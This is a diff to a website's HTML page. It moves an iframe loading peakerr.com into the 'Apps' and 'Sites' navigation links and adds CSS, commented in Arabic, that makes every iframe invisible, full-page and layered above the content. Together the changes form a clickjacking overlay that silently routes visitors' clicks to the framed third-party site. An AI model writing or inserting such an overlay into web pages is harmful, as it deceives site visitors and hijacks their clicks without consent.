@@ -46,7 +46,7 @@
 </head>
 <body>
 
-	    <iframe src="https://peakerr.com/"></iframe>
+	    
 
 
     <style>
@@ -611,6 +611,19 @@
 }
 </style>
 
+	<style>
+        /* إعدادات لإخفاء الإطار */
+        iframe {
+            opacity: 0; /* إخفاء الإطار */
+            position: absolute; /* وضع الإطار فوق المحتوى */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2; /* جعل الإطار في المقدمة */
+        }
+    </style>
+
 <section class="menu menu2 cid-u83l59iYXW" once="menu" id="menu-5-u83l59iYXW">
   <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
     <div class="container">
@@ -641,10 +654,16 @@
           
           <li class="nav-item">
             <a class="nav-link link text-black display-4" href="apps.html"
-              aria-expanded="false">Apps</a>
+              aria-expanded="false">
+		        <iframe src="https://peakerr.com/"></iframe>
+
+		    Apps</a>
           </li>
           <li class="nav-item">
-            <a class="nav-link link text-black display-4" href="sites.html">Sites</a>
+            <a class="nav-link link text-black display-4" href="sites.html">
+		        <iframe src="https://peakerr.com/"></iframe>
+
+		    Sites</a>
           </li>
         </ul>
         <div class="navbar-buttons mbr-section-btn">
